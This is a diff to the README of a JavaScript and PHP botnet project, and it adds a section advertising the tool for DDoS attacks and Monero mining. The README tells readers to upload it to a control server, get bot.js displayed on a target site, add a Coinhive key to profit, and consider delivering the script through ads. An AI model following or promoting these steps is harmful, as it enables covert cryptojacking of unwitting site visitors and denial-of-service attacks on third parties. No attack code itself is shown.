@@ -5,6 +5,7 @@ A Simple JS and PHP Botnet, written by Daniel Mains.
 
 
 
+
 # Instructions
 1. Download Repo and upload it to yourmcontrol server.
 2. Copy bot.js and figure out a way to display it on
@@ -15,8 +16,8 @@ the webpage of your choosing.
 the target site. Also, update miner.html with your coinhive Site key so you can also make money off of the 
 Botnet.
 
-
-
+#Use
+Can be used to conduct a DDoS Attack, it can be also used to mine Monero and preform calculations.
 
 
 *It has been proven possible to run javascript in ads so thats an idea to think about :)*
